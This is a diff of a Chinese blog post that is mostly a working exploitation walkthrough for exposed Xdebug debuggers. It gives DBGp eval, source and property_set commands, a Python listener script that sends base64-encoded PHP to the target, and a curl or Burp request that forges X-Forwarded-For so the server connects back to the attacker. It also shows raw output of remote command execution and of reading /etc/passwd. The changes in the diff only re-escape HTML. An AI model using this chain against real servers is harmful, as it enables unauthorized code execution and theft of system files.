 <p>transaction_id 貌似没有那么硬性的要求，每次都为 1 即可，fileURI 是要读取的文件的路径，需要注意的是，<strong>Xdebug 也受限于 open_basedir</strong>。</p>
 <p>利用方式</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source -i 1 -f file:///etc/passwd</span><br></pre></td></tr></table></figure>
-
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source -i 1 -f file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
 <p>还可以利用php://filter  ssrf等</p>
 <p>脚本里面要这样写</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conn.sendall(&apos;source -i 1 -f %s\x00&apos; % data)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conn.sendall(&#39;source -i 1 -f %s\x00&#39; % data)</span><br></pre></td></tr></table></figure>
 
-<h4 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">eval -i transaction_id -- &#123;DATA&#125;</span><br><span class="line"></span><br><span class="line">&#123;DATA&#125; 为 base64 过的 PHP 代码。 利用方式（c3lzdGVtKCJpZCIpOw== == system(&quot;id&quot;);）：</span><br><span class="line"></span><br><span class="line">eval -i 1 -- c3lzdGVtKCJpZCIpOw==</span><br></pre></td></tr></table></figure>
 
+<h4 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">eval -i transaction_id -- &#123;DATA&#125;</span><br><span class="line"></span><br><span class="line">&#123;DATA&#125; 为 base64 过的 PHP 代码。 利用方式（c3lzdGVtKCJpZCIpOw&#x3D;&#x3D; &#x3D;&#x3D; system(&quot;id&quot;);）：</span><br><span class="line"></span><br><span class="line">eval -i 1 -- c3lzdGVtKCJpZCIpOw&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
 <p>脚本里面要这样写</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conn.sendall(&apos;eval -i 1 -- %s\x00&apos; % data.encode(&apos;base64&apos;))</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conn.sendall(&#39;eval -i 1 -- %s\x00&#39; % data.encode(&#39;base64&#39;))</span><br></pre></td></tr></table></figure>
+
 
 <h4 id="property-set"><a href="#property-set" class="headerlink" title="property_set"></a>property_set</h4><p>代码执行 和eval一样，要是eval被禁了，可以用这个</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/* Do the eval */</span><br><span class="line">eval_string = xdebug_sprintf(&quot;%s = %s&quot;, CMD_OPTION(&apos;n&apos;), new_value);</span><br><span class="line">res = xdebug_do_eval(eval_string, &amp;ret_zval TSRMLS_CC);</span><br></pre></td></tr></table></figure>
-
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* Do the eval *&#x2F;</span><br><span class="line">eval_string &#x3D; xdebug_sprintf(&quot;%s &#x3D; %s&quot;, CMD_OPTION(&#39;n&#39;), new_value);</span><br><span class="line">res &#x3D; xdebug_do_eval(eval_string, &amp;ret_zval TSRMLS_CC);</span><br></pre></td></tr></table></figure>
 <p>利用方式</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">property_set -n $a -i 1 -c 1 -- c3lzdGVtKCJpZCIpOw== </span><br><span class="line">property_get -n $a -i 1 -c 1 -p 0</span><br></pre></td></tr></table></figure>
-
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">property_set -n $a -i 1 -c 1 -- c3lzdGVtKCJpZCIpOw&#x3D;&#x3D; </span><br><span class="line">property_get -n $a -i 1 -c 1 -p 0</span><br></pre></td></tr></table></figure>
 <p>脚本里面要这样写</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conn.sendall(&apos;property_set -n $a -i 1 -c 1 -- %s\x00&apos; % data.encode(&apos;base64&apos;))</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conn.sendall(&#39;property_set -n $a -i 1 -c 1 -- %s\x00&#39; % data.encode(&#39;base64&#39;))</span><br></pre></td></tr></table></figure>
+
+
+
 
 <h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><p>请求头</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php?XDEBUG_SESSION_START=phpstrom HTTP/1.1</span><br><span class="line">Host: 192.168.110.140:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">X-Forwarded-For:192.168.110.1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>
-
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;index.php?XDEBUG_SESSION_START&#x3D;phpstrom HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.110.140:8080</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko&#x2F;20100101 Firefox&#x2F;52.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">X-Forwarded-For:192.168.110.1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>
 <p>本地监听9000端口</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 9000</span><br><span class="line">listening on [any] 9000 ...</span><br><span class="line">192.168.110.140: inverse host lookup failed: h_errno 11004: NO_DATA</span><br><span class="line">connect to [192.168.110.1] from (UNKNOWN) [192.168.110.140] 53884: NO_DATA</span><br><span class="line">486 &lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"iso-8859-1"</span>?&gt;</span><br><span class="line">&lt;init xmlns=<span class="string">"urn:debugger_protocol_v1"</span> xmlns:xdebug=<span class="string">"http://xdebug.org/dbgp/xdebug"</span> fileuri=<span class="string">"file:///var/www/html/index.php"</span> language=<span class="string">"PHP"</span> xdebug:language_version=<span class="string">"7.1.12"</span> protocol_version=<span class="string">"1.0"</span> appid=<span class="string">"23"</span> idekey=<span class="string">"phpstrom"</span>&gt;&lt;engine version=<span class="string">"2.5.5"</span>&gt;&lt;![CDATA[Xdebug]]&gt;&lt;/engine&gt;&lt;author&gt;&lt;![CDATA[Derick Rethans]]&gt;&lt;/author&gt;&lt;url&gt;&lt;![CDATA[http://xdebug.org]]&gt;&lt;/url&gt;&lt;copyright&gt;&lt;![CDATA[Copyright (c) 2002-2017 by Derick Rethans]]&gt;&lt;/copyright&gt;&lt;/init&gt;</span><br></pre></td></tr></table></figure>
-
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 9000</span><br><span class="line">listening on [any] 9000 ...</span><br><span class="line">192.168.110.140: inverse host lookup failed: h_errno 11004: NO_DATA</span><br><span class="line">connect to [192.168.110.1] from (UNKNOWN) [192.168.110.140] 53884: NO_DATA</span><br><span class="line">486 &lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;iso-8859-1&quot;</span>?&gt;</span><br><span class="line">&lt;init xmlns=<span class="string">&quot;urn:debugger_protocol_v1&quot;</span> xmlns:xdebug=<span class="string">&quot;http://xdebug.org/dbgp/xdebug&quot;</span> fileuri=<span class="string">&quot;file:///var/www/html/index.php&quot;</span> language=<span class="string">&quot;PHP&quot;</span> xdebug:language_version=<span class="string">&quot;7.1.12&quot;</span> protocol_version=<span class="string">&quot;1.0&quot;</span> appid=<span class="string">&quot;23&quot;</span> idekey=<span class="string">&quot;phpstrom&quot;</span>&gt;&lt;engine version=<span class="string">&quot;2.5.5&quot;</span>&gt;&lt;![CDATA[Xdebug]]&gt;&lt;/engine&gt;&lt;author&gt;&lt;![CDATA[Derick Rethans]]&gt;&lt;/author&gt;&lt;url&gt;&lt;![CDATA[http://xdebug.org]]&gt;&lt;/url&gt;&lt;copyright&gt;&lt;![CDATA[Copyright (c) 2002-2017 by Derick Rethans]]&gt;&lt;/copyright&gt;&lt;/init&gt; </span><br></pre></td></tr></table></figure>
 <p>可以确定服务端开启了xdebug，并且开启了远程连接</p>
 <h4 id="攻击链"><a href="#攻击链" class="headerlink" title="攻击链"></a>攻击链</h4><p>先是burp发送请求访问调试界面，这时因为xdebug开启了回连，依次请求</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">xdebug.remote_addr_header</span><br><span class="line"></span><br><span class="line">X-Forwarded-For </span><br><span class="line"></span><br><span class="line">Remote-Addr</span><br></pre></td></tr></table></figure>
-
 <p>当访问到X-Forwarded-For的时候，就会访问其所指向的ip和端口(端口默认是9000，会自动的去请求9000端口，所以ip上不用加上9000端口)，这时在本地监听9000端口就可以收到xdebug发送的请求</p>
 <h3 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h3><p>创建一个exp2.py</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">ip_port = (<span class="string">'0.0.0.0'</span>,<span class="number">9000</span>)</span><br><span class="line">sk = socket.socket()</span><br><span class="line">sk.bind(ip_port)</span><br><span class="line">sk.listen(<span class="number">10</span>)</span><br><span class="line">conn, addr = sk.accept()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    client_data = conn.recv(<span class="number">1024</span>)</span><br><span class="line">    print(client_data)</span><br><span class="line"></span><br><span class="line">    data = raw_input(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    conn.sendall(<span class="string">'eval -i 1 -- %s\x00'</span> % data.encode(<span class="string">'base64'</span>))</span><br></pre></td></tr></table></figure>
-
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">ip_port = (<span class="string">&#x27;0.0.0.0&#x27;</span>,<span class="number">9000</span>)</span><br><span class="line">sk = socket.socket()</span><br><span class="line">sk.bind(ip_port)</span><br><span class="line">sk.listen(<span class="number">10</span>)</span><br><span class="line">conn, addr = sk.accept()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    client_data = conn.recv(<span class="number">1024</span>)</span><br><span class="line">    print(client_data)</span><br><span class="line"></span><br><span class="line">    data = raw_input(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    conn.sendall(<span class="string">&#x27;eval -i 1 -- %s\x00&#x27;</span> % data.encode(<span class="string">&#x27;base64&#x27;</span>))</span><br></pre></td></tr></table></figure>
 <p>这段代码就是代替nc 监听9000端口(eval可以换成source property_set等)</p>
 <p>主机运行</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 exp2.py</span><br></pre></td></tr></table></figure>
-
 <p>burp发包</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php?XDEBUG_SESSION_START=phpstrom HTTP/1.1</span><br><span class="line">Host: 192.168.110.140:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">X-Forwarded-For:192.168.110.1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>
-
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;index.php?XDEBUG_SESSION_START&#x3D;phpstrom HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.110.140:8080</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko&#x2F;20100101 Firefox&#x2F;52.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">X-Forwarded-For:192.168.110.1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>
 <p>还是刚才那个数据包</p>
 <p>也可以这样,更方便一点</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">'http://192.168.110.140/index.php?XDEBUG_SESSION_START=PHPSTORM'</span> -H <span class="string">"X-Forwarded-For:你的公网IP地址"</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://192.168.110.140/index.php?XDEBUG_SESSION_START=PHPSTORM&#x27;</span> -H <span class="string">&quot;X-Forwarded-For:你的公网IP地址&quot;</span></span><br></pre></td></tr></table></figure>
+
 
 <p>在回弹的窗口中执行</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; system(<span class="string">'ls'</span>);</span><br><span class="line">263 &lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"iso-8859-1"</span>?&gt;</span><br><span class="line">&lt;response xmlns=<span class="string">"urn:debugger_protocol_v1"</span> xmlns:xdebug=<span class="string">"http://xdebug.org/dbgp/xdebug"</span> <span class="built_in">command</span>=<span class="string">"eval"</span> transaction_id=<span class="string">"1"</span>&gt;&lt;property <span class="built_in">type</span>=<span class="string">"string"</span> size=<span class="string">"9"</span> encoding=<span class="string">"base64"</span>&gt;&lt;![CDATA[aW5kZXgucGhw]]&gt;&lt;/property&gt;&lt;/response&gt;</span><br></pre></td></tr></table></figure>
-
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; system(<span class="string">&#x27;ls&#x27;</span>);</span><br><span class="line">263 &lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;iso-8859-1&quot;</span>?&gt;</span><br><span class="line">&lt;response xmlns=<span class="string">&quot;urn:debugger_protocol_v1&quot;</span> xmlns:xdebug=<span class="string">&quot;http://xdebug.org/dbgp/xdebug&quot;</span> <span class="built_in">command</span>=<span class="string">&quot;eval&quot;</span> transaction_id=<span class="string">&quot;1&quot;</span>&gt;&lt;property <span class="built_in">type</span>=<span class="string">&quot;string&quot;</span> size=<span class="string">&quot;9&quot;</span> encoding=<span class="string">&quot;base64&quot;</span>&gt;&lt;![CDATA[aW5kZXgucGhw]]&gt;&lt;/property&gt;&lt;/response&gt;</span><br></pre></td></tr></table></figure>
 <p>注意这里的ls命令是在linux下的  如果在windows下，需要cmd命令</p>
 <p>这一段</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[CDATA[aW5kZXgucGhw]]&gt;</span><br></pre></td></tr></table></figure>
-
 <p>base64解码 就可以拿到文件名 ==&gt;index.php</p>
-<h3 id="file协议读文件"><a href="#file协议读文件" class="headerlink" title="file协议读文件"></a>file协议读文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; system(<span class="string">'curl file:///etc/passwd'</span>)</span><br><span class="line">348 &lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"iso-8859-1"</span>?&gt;</span><br><span class="line">&lt;response xmlns=<span class="string">"urn:debugger_protocol_v1"</span> xmlns:xdebug=<span class="string">"http://xdebug.org/dbgp/xdebug"</span> <span class="built_in">command</span>=<span class="string">"eval"</span> transaction_id=<span class="string">"1"</span>&gt;&lt;property <span class="built_in">type</span>=<span class="string">"string"</span> size=<span class="string">"72"</span> encoding=<span class="string">"base64"</span>&gt;&lt;![CDATA[c3lzdGVtZC1idXMtcHJveHk6eDoxMDM6MTA2OnN5c3RlbWQgQnVzIFByb3h5LCwsOi9ydW4vc3lzdGVtZDovYmluL2ZhbHNl]]&gt;&lt;/property&gt;&lt;/response&gt;</span><br></pre></td></tr></table></figure>
-
+<h3 id="file协议读文件"><a href="#file协议读文件" class="headerlink" title="file协议读文件"></a>file协议读文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; system(<span class="string">&#x27;curl file:///etc/passwd&#x27;</span>)</span><br><span class="line">348 &lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;iso-8859-1&quot;</span>?&gt;</span><br><span class="line">&lt;response xmlns=<span class="string">&quot;urn:debugger_protocol_v1&quot;</span> xmlns:xdebug=<span class="string">&quot;http://xdebug.org/dbgp/xdebug&quot;</span> <span class="built_in">command</span>=<span class="string">&quot;eval&quot;</span> transaction_id=<span class="string">&quot;1&quot;</span>&gt;&lt;property <span class="built_in">type</span>=<span class="string">&quot;string&quot;</span> size=<span class="string">&quot;72&quot;</span> encoding=<span class="string">&quot;base64&quot;</span>&gt;&lt;![CDATA[c3lzdGVtZC1idXMtcHJveHk6eDoxMDM6MTA2OnN5c3RlbWQgQnVzIFByb3h5LCwsOi9ydW4vc3lzdGVtZDovYmluL2ZhbHNl]]&gt;&lt;/property&gt;&lt;/response&gt;</span><br></pre></td></tr></table></figure>
 <p>这里好像有字符数量限制</p>
-<h3 id="利用source读文件"><a href="#利用source读文件" class="headerlink" title="利用source读文件"></a>利用source读文件</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">只需要把eval改成这样</span><br><span class="line">conn.sendall(<span class="string">'source -i 1 -f file:///%s\x00'</span> % data)</span><br></pre></td></tr></table></figure>
-
+<h3 id="利用source读文件"><a href="#利用source读文件" class="headerlink" title="利用source读文件"></a>利用source读文件</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">只需要把<span class="built_in">eval</span>改成这样</span><br><span class="line">conn.sendall(<span class="string">&#x27;source -i 1 -f file:///%s\x00&#x27;</span> % data)</span><br></pre></td></tr></table></figure>
 <p>这里还是有点问题，不能一次读完 貌似得用绝对路径  </p>
 <p>用index.php的时候，报错没找到文件   ./index.php也不行</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; ./index.php</span><br><span class="line">283 &lt;?xml version=&quot;1.0&quot; encoding=&quot;iso-8859-1&quot;?&gt;</span><br><span class="line">&lt;response xmlns=&quot;urn:debugger_protocol_v1&quot; xmlns:xdebug=&quot;http://xdebug.org/dbgp/xdebug&quot; command=&quot;source&quot; transaction_id=&quot;1&quot; status=&quot;starting&quot; reason=&quot;ok&quot;&gt;&lt;error code=&quot;100&quot;&gt;&lt;message&gt;&lt;![CDATA[can not open file]]&gt;&lt;/message&gt;&lt;/error&gt;&lt;/response&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; .&#x2F;index.php</span><br><span class="line">283 &lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;iso-8859-1&quot;?&gt;</span><br><span class="line">&lt;response xmlns&#x3D;&quot;urn:debugger_protocol_v1&quot; xmlns:xdebug&#x3D;&quot;http:&#x2F;&#x2F;xdebug.org&#x2F;dbgp&#x2F;xdebug&quot; command&#x3D;&quot;source&quot; transaction_id&#x3D;&quot;1&quot; status&#x3D;&quot;starting&quot; reason&#x3D;&quot;ok&quot;&gt;&lt;error code&#x3D;&quot;100&quot;&gt;&lt;message&gt;&lt;![CDATA[can not open file]]&gt;&lt;&#x2F;message&gt;&lt;&#x2F;error&gt;&lt;&#x2F;response&gt;</span><br></pre></td></tr></table></figure>
+
 
 <p>连续两次命令，会把第一次没有发送完的文件，在发送过来（难道是nc接受的问题？？？ 或者是服务端限制了文件的大小，当第二次读文件的时候，会从上一次结束的地方，继续往下读）</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; /etc/passwd</span><br><span class="line">1805 &lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"iso-8859-1"</span>?&gt;</span><br><span class="line">&lt;response xmlns=<span class="string">"urn:debugger_protocol_v1"</span> xmlns:xdebug=<span class="string">"http://xdebug.org/dbgp/xdebug"</span> <span class="built_in">command</span>=<span class="string">"source"</span> transaction_id=<span class="string">"1"</span> encoding=<span class="string">"base64"</span>&gt;&lt;![CDATA[cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9u</span><br><span class="line">&gt;&gt; /etc/passwd</span><br><span class="line">b2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtdGltZXN5bmM6eDoxMDA6MTAzOnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb24sLCw6L3J1bi9zeXN0ZW1kOi9iaW4vZmFsc2UKc3lzdGVtZC1uZXR3b3JrOng6MTAxOjEwNDpzeXN0ZW1kIE5ldHdvcmsgTWFuYWdlbWVudCwsLDovcnVuL3N5c3RlbWQvbmV0aWY6L2Jpbi9mYWxzZQpzeXN0ZW1kLXJlc29sdmU6eDoxMDI6MTA1OnN5c3RlbWQgUmVzb2x2ZXIsLCw6L3J1bi9zeXN0ZW1kL3Jlc29sdmU6L2Jpbi9mYWxzZQpzeXN0ZW1kLWJ1cy1wcm94eTp4OjEwMzoxMDY6c3lzdGVtZCBCdXMgUHJveHksLCw6L3J1bi9zeXN0ZW1kOi9iaW4vZmFsc2UK</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; /etc/passwd</span><br><span class="line">1805 &lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;iso-8859-1&quot;</span>?&gt;</span><br><span class="line">&lt;response xmlns=<span class="string">&quot;urn:debugger_protocol_v1&quot;</span> xmlns:xdebug=<span class="string">&quot;http://xdebug.org/dbgp/xdebug&quot;</span> <span class="built_in">command</span>=<span class="string">&quot;source&quot;</span> transaction_id=<span class="string">&quot;1&quot;</span> encoding=<span 